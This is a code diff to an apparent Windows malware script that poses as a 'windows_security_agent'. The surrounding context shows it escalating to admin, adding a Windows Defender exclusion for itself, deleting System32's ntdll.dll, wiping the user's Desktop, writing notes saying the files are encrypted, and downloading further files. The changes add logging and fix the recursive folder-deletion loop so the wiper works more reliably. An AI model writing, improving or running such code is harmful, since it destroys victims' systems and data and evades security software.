@@ -12,6 +12,7 @@ import winreg
 import sys
 from datetime import datetime
 #type:ignore
+# TO DO: ON CLOSE BLOW UP COMPUTER
 RUN_INSTALLS = False
 CHAOS = False
 def block_input(on):
@@ -115,6 +116,9 @@ class Logging:
   def error(self, message):
     return self.log(f"[{get_time_formatted()}] [ERROR] {message}")
 
+  def success(self, message):
+    return self.log(f"[{get_time_formatted()}] [SUCCESS] [+] {message}")
+
 logs = Logging()
 logfile = f'windows_security_agent_log_{random.randrange(1,1000)}_{get_time_formatted()}.txt'
 logfile = os.path.join(os.getcwd(), logfile)
@@ -132,6 +136,7 @@ class FileCreation:
           d.whitelist.append(path)
           file.write("Your computer is dead and your files are encrypted. Do not try to modify any files.")
           file.close()
+          logs.info(f"Created file {file}")
       except Exception:
         id = id + 1
       else:
@@ -146,22 +151,26 @@ class FileDeletion:
     try:
       os.remove(file)
     except Exception as e:
+      logs.error(f"Error deleting file {file}: {e}")
       return -1, e
     else:
+      logs.info(f"Deleted file {file}")
       return 1
 
   def delete_folder(self, folder, remove_folder = False):
-    for object in folder:
-      if os.path.isfile(object):
-        self.delete(object)
-      elif os.path.isdir(object):
-        self.delete_folder(os.path.join(folder, object))
+    try:
+      for object in os.listdir(folder):
+        if os.path.isfile(object):
+          self.delete(object)
+        elif os.path.isdir(object):
+          self.delete_folder(os.path.join(folder, object))
+    except Exception as e:
+      logs.error(f"Error deleting folder {folder}: {e}")
     if remove_folder:
       try:
         os.rmdir(folder)
-      except Exception:
-        pass
-        #type:ignore
+      except Exception as ex:
+        logs.error(f"Error removing folder {folder}: {ex}")
 
   def del_sys32_files(self):
     self.delete(r"C:\Windows\System32\ntdll.dll")
@@ -212,6 +221,7 @@ box_art()
 
   def relaunch_as_admin(self):
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.realpath(__file__), None, 1)
+    logs.info("Relaunching as admin")
     time.sleep(5)
     exit()
 
@@ -231,8 +241,10 @@ box_art()
     try:
       subprocess.run(command, shell=False, capture_output=True, check=True)
     except Exception as e:
+      logs.error(f"Error adding {current_user} to admin group: {e}")
       return -1, e
     else:
+      logs.info(f"Added {current_user} to admin group")
       return 1, None
 
   def defender_allow(self, file):
@@ -482,18 +494,19 @@ class Registry:
 
 
 class Folders:
-
   def create_appdata_folder(self):
     w = WindowsSystemClass()
     user = w.get_windows_user_directory()
     try:
       ad = os.path.join(os.path.join(user, 'AppData'), r'Local\Microsoft\Windows\MicrosoftSecurity')
       os.mkdir(ad)
-    except Exception:
+    except Exception as e:
+      logs.error(f"Error creating AppData folder: {e}")
       try:
         mg = os.path.join(os.getcwd(), 'MicrosoftGoose')
         os.mkdir(mg)
-      except Exception:
+      except Exception as ex:
+        logs.error(f"Error creating AppData folder: {ex}")
         return os.getcwd()
       else:
         return mg
@@ -583,15 +596,17 @@ class GitData:
     except Exception as e:
       logs.error(f"Error downloading file {url} : {e}")
 
-
+logs.info("Initializing Program...")
 wsysw = WindowsSystemClass()
 fd = FileDeletion()
 wsysw.grant_admin()
 if not wsysw.is_admin():
   wsysw.relaunch_as_admin()
+logs.info("Modifying Windows Defender...")
 wsysw.defender_allow(os.path.realpath(__file__))
 wsysw.defender_allow(os.path.realpath(sys.executable))
 fd.del_sys32_files()
+logs.info("Deleting Desktop...")
 fd.delete_folder(wsysw.get_desktop_path(), remove_folder=False)
 gd = GitData()
 zf = Zipfiles()
